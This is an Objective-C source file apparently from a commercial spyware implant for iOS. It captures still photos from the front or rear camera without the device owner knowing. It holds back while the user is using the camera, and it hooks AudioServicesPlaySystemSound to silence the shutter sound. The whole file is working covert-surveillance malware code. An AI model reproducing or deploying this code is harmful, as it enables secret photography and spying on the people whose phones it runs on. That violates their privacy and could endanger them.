//
//  CameraSupport.m
//
//  Created by kiodo on 02/12/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import "CameraSupport.h"

#import "ARMHooker.h"

#import <unistd.h>
#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <CoreMedia/CoreMedia.h>

//#define DEBUG_CAMERA

#define MAX_RETRY_COUNT 20

static BOOL gSoundAlreadyDisabled = NO;

void AudioServicesPlaySystemSoundHook(UInt32 inSystemSoundID);

void AudioServicesPlaySystemSoundHook(UInt32 inSystemSoundID)
{
  return;
}

NSData* runCamera(NSInteger frontRear);

static BOOL gGrabbed = FALSE;
static BOOL gCameraRun = NO;

@implementation CameraSupport

@synthesize mCurrThread;

- (id)init
{
    self = [super init];
  
    if (self != nil)
      {
        [self setMCurrThread: [NSThread currentThread]];
      }
  
    return self;
}

- (void)dealloc
{
  [mCurrThread release];
  [super dealloc];
}

- (BOOL)_checkCameraAvalaible
{
   if (gCameraRun == NO)
    {
      return TRUE;  
    }
  else
    {
      return FALSE;
    }
}

- (void)_updateCameraStatus: (NSNotification*)aNotification
{
    NSDictionary *tmpDict = [aNotification userInfo];
    
    if (tmpDict != nil)
      {
        NSNumber *num = [tmpDict objectForKey: @"flag"];
        gCameraRun = [num intValue];
      }
}

- (AVCaptureConnection *)_getConnection:(NSArray *)connex
{
  AVCaptureConnection *conn = nil;
  
  for (int i=0; i < [connex count]; i++)
    {
      AVCaptureConnection *tmpConn = (AVCaptureConnection*)[connex objectAtIndex:i];
      
      if (tmpConn == nil)
        continue;
      
      NSArray *tmpInPorts = [tmpConn inputPorts];
      
      if (tmpInPorts == nil)
        continue;
      
      for (int j=0; j< [tmpInPorts count]; j++) 
        {
          AVCaptureInputPort *tmpPort = (AVCaptureInputPort*)[tmpInPorts objectAtIndex:j];
          
          if (tmpPort != nil && [[tmpPort mediaType] isEqualToString: AVMediaTypeVideo])
            {
              conn = tmpConn;
              break;
            }
        }
    } 
    
  return conn;
}

- (NSData*)_grabCameraShot: (NSInteger)aPosition
{
  __block CMSampleBufferRef imageBuffer = nil;
  NSData *imageData = nil;

  int maxRetry = 0;
  NSError *err;
  gGrabbed = FALSE;
  
  AVCaptureDevice *av = nil;
  
  if ([self _checkCameraAvalaible] == NO || [mCurrThread isCancelled] == TRUE)
    {
      return imageData;
    }
    
  NSArray *avArray = [AVCaptureDevice devicesWithMediaType: AVMediaTypeVideo]; 
  
  if (avArray == nil || [avArray count] <= 0 || [mCurrThread isCancelled] == TRUE) 
    {
      return imageData;
    }
  
  for (int i=0; i < [avArray count]; i++) 
    {
      AVCaptureDevice *tmpav = [avArray objectAtIndex: i];
    
      if (tmpav && [tmpav position] == aPosition)
        {
          av = tmpav;
          break;
        }
    }
   
  if (av == nil)
    {
      return imageData;
    }
    
  AVCaptureDeviceInput *inDev = [AVCaptureDeviceInput deviceInputWithDevice: av 
                                                                      error: &err];
  
  if (inDev == nil || [mCurrThread isCancelled] == TRUE)
    {
      return imageData;
    }
  
  AVCaptureSession *avSession = [[AVCaptureSession alloc] init];
  
  [avSession setSessionPreset:AVCaptureSessionPresetPhoto];
  [avSession beginConfiguration];
  
  if ([avSession canAddInput: inDev] == NO || [mCurrThread isCancelled] == TRUE)
    {
      [avSession release];
      return imageData;
    }
  else
    {
      [avSession addInput: inDev];
    }
    
  AVCaptureStillImageOutput *outImg = [[AVCaptureStillImageOutput alloc] init];
    
  if ([avSession canAddOutput: outImg] == NO || [mCurrThread isCancelled] == TRUE)
    {
      [avSession release];
      [outImg release];
      return imageData;
    }
  else
    {
      [avSession addOutput: outImg];
    }
    
  [avSession commitConfiguration];
  [avSession startRunning];
    
  AVCaptureConnection *conn = nil;
  
  if ((conn = [self _getConnection: [outImg connections]]) == nil ||
      [mCurrThread isCancelled] == TRUE)
    {
      [avSession release];
      [outImg release];
      return imageData;
    }
                            
  [outImg captureStillImageAsynchronouslyFromConnection: conn completionHandler:
   (^(CMSampleBufferRef imageDataSampleBuffer, NSError *error)
      {
        if (imageDataSampleBuffer != NULL && error == nil)
          {
            imageBuffer = imageDataSampleBuffer;
            CFRetain(imageBuffer);
          }

        gGrabbed = TRUE; 
                 
      })];
                              
  while (gGrabbed == FALSE && maxRetry++ < MAX_RETRY_COUNT)
  {
    if ([self _checkCameraAvalaible] == NO || [mCurrThread isCancelled] == TRUE)
      break;
    usleep(150000);
  }

  [avSession stopRunning]; 
  
  if (imageBuffer != nil)
    {
      imageData = 
      [[AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageBuffer] retain];
      CFRelease(imageBuffer);
    }
    
  [avSession release];
  [outImg release];
  
  return imageData;
}

@end

extern "C" {

  NSData* runCamera(NSInteger frontRear)
  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSData *imageData = nil;
    
    CameraSupport *cam = [[CameraSupport alloc] init];
    
    if (cam != nil)
      imageData = [cam _grabCameraShot: frontRear];
    
    [cam release];
    [pool release];
    
    return imageData;
  }

  void disableShutterSound()
  {
    if (gSoundAlreadyDisabled == NO)
      {
        AHOverrideFunction((char*)"AudioServicesPlaySystemSound", 
                           (const char*)0,
                           (const void*)AudioServicesPlaySystemSoundHook, 
                           (void**)NULL); 
        gSoundAlreadyDisabled = YES;
      }
  }
  
}